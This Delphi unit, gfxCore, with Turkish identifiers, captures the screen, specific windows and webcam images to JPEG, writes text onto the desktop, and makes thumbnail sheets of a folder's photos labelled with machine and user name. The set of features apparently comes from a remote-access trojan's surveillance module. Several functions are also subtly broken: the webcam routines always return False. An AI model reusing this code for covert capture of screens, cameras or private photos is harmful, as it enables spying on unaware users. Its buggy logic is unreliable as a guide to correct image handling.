unit gfxCore;

interface
Function SaveScr(Quality : Integer; SavAs : String) : Boolean;
function Camkaydet(kalite : integer; yer : string) : Boolean;
procedure PrintInCoordinate(Text:string; x,y,boyut,renk,arka:Integer;merkez:string);
Function pencerekap(Quality : Integer; pencere,SavAs : String) : Boolean;
Function advCamkaydet(pw,gec,kalite : integer; yer : string) : Boolean;
function CreateThumbnail(klasor,nereye:string;kalite,maxsk:integer) : boolean;

implementation

uses
Windows,
Classes,
untwebcam,
graphics,
sysutils,
apicore,
Jpeg;

Function Bmp2Jpg(Bit : TBitmap; Quality : Integer) : TJpegImage;
Var
 Jpg : TJpegImage;
begin
 try
  Jpg := TJpegImage.Create;
  Jpg.CompressionQuality := Quality;
  Jpg.Compress;
  Jpg.Assign(Bit);
 finally
  Bit.Free;
 end;
 Result := Jpg;
end;

function GetDcAsBitmap(DC: HDC; W, H: Cardinal): TBitmap;
var
Bitmap: TBitmap;
  hdcCompatible: HDC;
  hbmScreen: HBitmap;
begin
Result := nil;
try
  if DC = 0 then Exit;
  bitmap:=Tbitmap.create;
  hdcCompatible := CreateCompatibleDC(DC);
  hbmScreen := CreateCompatibleBitmap(DC, W, H);
  if (hbmScreen = 0) then Exit;
  if (SelectObject(hdcCompatible, hbmScreen)=0) then Exit;
  if not(BitBlt(hdcCompatible, 0,0, W, H, DC, 0,0, SRCCOPY)) then Exit;
  Bitmap.Handle := HbmScreen;
  Bitmap.Dormant;
  Result := bitmap;
finally;
end;
end;

function CreateThumbnail(klasor,nereye:string;kalite,maxsk:integer) : boolean;
var
JpegImage: TJpegImage;
Bitmap: TBitmap;
ARect: TRect;
FileName,isim:string;
FindHandle:THandle;
SearchRec:TWIN32FindData;
sol,sag,ust,alt,dizi:integer;
label
hede;
begin
sol:=0;
sag:=99;
ust:=0;
alt:=99;
result:=false;
try
JpegImage:=TJpegImage.Create;
Bitmap:=TBitmap.Create;
bitmap.Width:=GetSystemMetrics(SM_CXSCREEN);
Bitmap.Height:=GetSystemMetrics(SM_CYSCREEN);

Bitmap.Canvas.Brush.Color:=clblack;
Bitmap.Canvas.FillRect(Rect(0,0,bitmap.Width,bitmap.Height));
bitmap.Canvas.Font.Name:='Verdana';
bitmap.Canvas.Font.Size:=8;
bitmap.Canvas.Font.Color:=cllime;
dizi:=0;
FindHandle := FindFirstFile(pchar(klasor+'\*.jpg'), SearchRec);
if FindHandle <> INVALID_HANDLE_VALUE then
repeat
FileName:=SearchRec.cFileName;
if getfilesize(filename) div 1024 div 1024 > maxsk then goto hede;
if alt >= bitmap.Height then bitmap.Height:=alt+99;
jpegimage.LoadFromFile(klasor+'\'+filename);
sleep(1);
dizi:=dizi+1;
ARect:=Rect(sol,ust,sag,alt);
Bitmap.Canvas.StretchDraw(ARect,JpegImage);
sleep(1);
bitmap.Canvas.TextOut(sol+1,ust+86,copy(filename,1,13));
sol:=sol+99;
sag:=sag+99;
if (dizi-10)=0 then begin
sol:=0;
sag:=99;
ust:=ust+99;
alt:=alt+99;
dizi:=0;
end;
sleep(250);
hede:
until FindNextFile(FindHandle,SearchRec)=false;
Windows.FindClose(FindHandle);
jpegimage.Free;
isim:=makine+'@'+kullanici;
bitmap.Canvas.Font.Size:=16;
bitmap.Canvas.Font.Color:=clred;
bitmap.Canvas.TextOut(bitmap.Width div 2+(length(isim)*9),bitmap.Height-60,isim);
bitmap.Canvas.Font.Size:=10;
bitmap.Canvas.Font.Color:=cllime;
bitmap.Canvas.TextOut(bitmap.Width div 2+(length(isim)*9),bitmap.Height-32,klasor);
Bmp2Jpg(bitmap, kalite).SaveToFile(nereye);
except on exception do exit;
end;
result:=true;
end;

function GetWindowAsBitmap(const WindowName: string): Tbitmap;
var Wnd: HWnd;
    Rect: TRect;
begin
result:=nil;
try
   Wnd := FindWindow(nil, PChar(WindowName));
   GetWindowRect(Wnd, Rect);
   Result := GetDCAsBitmap(GetWindowDC(Wnd), Rect.Right - Rect.Left, Rect.Bottom - Rect.Top);
except on exception do exit;
end;
end;

Function pencerekap(Quality : Integer; pencere,SavAs : String) : Boolean;
begin
result:=false;
try
Bmp2Jpg(GetWindowAsBitmap(pencere), Quality).SaveToFile(SavAs);
except on exception do exit;
end;
result:=true
end;

procedure PrintInCoordinate(Text:string; x,y,boyut,renk,arka:Integer;merkez:string);
var
   CrLf,cLine:string;
   c,LineH,p:LongInt;
   Dc:HDC;
   ortasi:integer;
begin
try
  CrLf:=#13#10;
   c:=0;
   Dc:=GetWindowDc(GetDesktopWindow);
   with TCanvas.Create do
   begin
      Handle:=Dc;
      Font.Size:=boyut;
      Font.Color:=renk;
      font.Name:='Verdana';
      Brush.Color:=arka;
      LineH:=TextHeight('H');
      p:=Pos(CrLf,Text);
      while p > 0 do
      begin
         cLine:=Copy(Text,1,p - 1);
         Text:=Copy(Text,p + Length(CrLf),Length(Text));
         TextOut(X,Y + (c * LineH),cLine);
         c:=c + 1;
         p:=Pos(CrLf,Text);
      end;

      if merkez='X' then begin
      ortasi:=textwidth(text) div 2;
      x:=GetSystemMetrics(SM_CXSCREEN) div 2 - ortasi;
      y:=GetSystemMetrics(SM_CYSCREEN) div 2 - TextHeight('H')
      end;

      TextOut(X,Y + (c * LineH),Text);
      Free;
   end;
except on Exception do exit
end;
end;

Function ScrBmp : TBitmap;
Var
 Bit : TBitmap;
 Canv : TCanvas;
 Rec : TRect;
 X, Y : Integer;
begin
 Canv := TCanvas.Create;
 Canv.Handle := GetDC(GetDeskTopWindow);
 X := GetSystemMetrics(SM_CXSCREEN);
 Y := GetSystemMetrics(SM_CYSCREEN);
 Try
  Bit := TBitmap.Create;
  Bit.Width := X;
  Bit.Height := Y;
  Rec := Rect(0, 0, X, Y);
  Bit.Canvas.CopyRect(Rec, Canv, Rec);
 Finally
  ReleaseDC(0, Canv.Handle);
 end;
 Result := Bit;
end;

//************* End of JPG ***********************************

//*********** Function to call when saving *******************
Function SaveScr(Quality : Integer; SavAs : String) : Boolean;
begin
result:=false;
try
Bmp2Jpg(ScrBmp, Quality).SaveToFile(SavAs);
except
on EFCreateError DO exit;
end;
result:=true
end;

Function advCamkaydet(pw,gec,kalite : integer; yer : string) : Boolean;
var
p : TPicture;
j : TJpegImage;
resim:string;
begin
{$I-}
result:=False;
randomize;
resim:=tempdizini+'tmp'+inttostr(random(120931))+'.tmp';
advcam(pw,gec,resim);
sleep(1);
try
p := TPicture.Create;
p.Bitmap.LoadFromFile(resim);
j := TJpegImage.Create;
j.Assign(p.Bitmap);
j.CompressionQuality := kalite;
j.SaveToFile(yer);
p.Free;
j.Free;
result := true;
sleep(1);
DeleteFile(resim);
except
on EFOpenError DO exit;
on EFCreateError DO exit;
end;
result := False
end;

Function Camkaydet(kalite : integer; yer : string) : Boolean;
var
p : TPicture;
j : TJpegImage;
resim:string;
begin
{$I-}
result:=False;
randomize;
resim:=tempdizini+'tmp'+inttostr(random(120931))+'.tmp';
WebcamPic(resim);
sleep(100);
try
p := TPicture.Create;
p.Bitmap.LoadFromFile(resim);
j := TJpegImage.Create;
j.Assign(p.Bitmap);
j.CompressionQuality := kalite;
j.SaveToFile(yer);
p.Free;
j.Free;
result := true;
sleep(1);
DeleteFile(resim);
except
on EFOpenError DO exit;
on EFCreateError DO exit;
end;
result := False
end;
//************* End of call function *************************

end.
